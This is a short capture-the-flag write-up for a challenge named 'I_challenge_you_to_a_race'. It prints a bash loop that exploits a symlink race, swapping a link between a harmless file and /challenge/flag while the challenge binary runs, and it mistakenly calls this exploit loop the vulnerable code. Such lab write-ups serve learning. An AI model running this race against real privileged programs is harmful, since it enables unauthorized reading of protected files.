# Challenge I_challenge_you_to_a_race Writeup

## Vulnerability: Symbolic Link Vulnerability

### Where:
The vulnerability is present in the following code:

```bash
for i in {1..150}; do
    ln -sf /tmp/estudasses/ola.txt pointer
    echo "pointer" | /challenge/challenge &
    ln -sf /challenge/flag pointer
done
```

# Impact:
The code exploits a symbolic link vulnerability. By creating symbolic links to different files before and after running the /challenge/challenge command in the background, it allows an attacker to manipulate file references.

This vulnerability may lead to unauthorized access or manipulation of files and potentially compromise the integrity of the system.

# Note:
The provided code creates symbolic links to /tmp/estudasses/ola.txt and /challenge/flag files, which can have security implications, especially if the /challenge/challenge command operates on the linked files without proper validation.

# Steps to Reproduce:
```bash
# Step 1: Create symbolic link to /tmp/estudasses/ola.txt
ln -sf /tmp/estudasses/ola.txt pointer

# Step 2: Run the /challenge/challenge command in the background with input "pointer"
echo "pointer" | /challenge/challenge &

# Step 3: Create another symbolic link to /challenge/flag
ln -sf /challenge/flag pointer

# Step 4: Repeat the above steps in a loop (150 times in the provided code).

# Step 5: Observe any unexpected behavior or unauthorized access to sensitive files.
